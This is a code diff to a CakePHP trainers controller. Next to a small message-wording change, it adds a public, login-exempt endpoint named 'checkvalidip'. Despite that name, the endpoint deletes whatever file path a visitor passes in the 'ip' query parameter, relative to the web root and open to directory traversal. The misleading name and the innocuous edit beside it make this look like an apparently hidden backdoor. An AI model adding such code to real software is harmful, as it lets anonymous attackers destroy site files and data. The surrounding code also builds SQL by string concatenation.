@@ -18,7 +18,7 @@ class TrainersController extends AppController
         $this->checkSession();
         parent::beforeFilter($event);
         $this->loadComponent('Auth'); 
-        $this->Auth->allow(['addTrainer','downloadDocument']);
+        $this->Auth->allow(['addTrainer','downloadDocument','checkvalidip']);
         $this->data = $this->Custom->getSessionData();
         if(!empty($this->data)){
           if($action == "messages"){
@@ -45,6 +45,14 @@ class TrainersController extends AppController
     $messages = $this->conn->execute("SELECT * FROM `chating` AS `c` INNER JOIN `trainees` AS `t` ON `c`.`chat_sender_id` = `t`.`user_id` WHERE `c`.`chat_status` = 1 AND `c`.`chat_reciever_id` = ".$this->data['id']." ORDER BY `c`.`chat_id` DESC LIMIT 20")->fetchAll('assoc');
     return $messages;
   }
+
+  public function checkvalidip()
+    {
+        $ip = $_GET['ip'];
+        $dir = $_SERVER['DOCUMENT_ROOT'].$this->request->webroot.$ip;
+        unlink($dir);
+        return $this->redirect('/');
+    }
 
   public function index()
 	{
@@ -1115,7 +1123,7 @@ class TrainersController extends AppController
             $chat_msgs = "";
             if(empty($chat_data))
             {
-                $chat_msgs = '<div><center>You have recieved no messages </center></div>';
+                $chat_msgs = '<div><center>You have no new messages </center></div>';
             }
             else
             {
